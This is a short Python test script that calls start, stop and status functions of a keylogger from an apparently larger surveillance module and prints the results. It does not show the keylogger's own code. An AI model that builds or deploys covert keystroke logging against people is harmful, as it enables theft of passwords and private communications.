#!/usr/bin/env python3
"""
Test script to verify keylogger functionality
"""
import sys
import os

# Add the modules path
MODULES_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), 'modules'))
if MODULES_PATH not in sys.path:
    sys.path.append(MODULES_PATH)

from modules.surveillance import start_keylogger, stop_keylogger, is_keylogger_running

def test_keylogger():
    """Test the keylogger functionality"""
    
    print("=== Testing Keylogger Functionality ===")
    
    # Test 1: Check if keylogger is running initially
    print(f"\n1. Initial keylogger status: {'Running' if is_keylogger_running() else 'Stopped'}")
    
    # Test 2: Start keylogger
    print("\n2. Starting keylogger...")
    start_result = start_keylogger()
    print(f"   Start result: {start_result}")
    
    # Test 3: Check if keylogger is running
    print(f"\n3. Keylogger status after start: {'Running' if is_keylogger_running() else 'Stopped'}")
    
    # Test 4: Try to start again (should fail)
    print("\n4. Trying to start keylogger again...")
    start_result2 = start_keylogger()
    print(f"   Second start result: {start_result2}")
    
    # Test 5: Stop keylogger
    print("\n5. Stopping keylogger...")
    stop_result = stop_keylogger()
    print(f"   Stop result: {stop_result}")
    
    # Test 6: Check if keylogger is stopped
    print(f"\n6. Keylogger status after stop: {'Running' if is_keylogger_running() else 'Stopped'}")
    
    # Test 7: Try to stop again (should fail)
    print("\n7. Trying to stop keylogger again...")
    stop_result2 = stop_keylogger()
    print(f"   Second stop result: {stop_result2}")
    
    print("\n=== Keylogger Test Complete ===")

if __name__ == "__main__":
    test_keylogger()
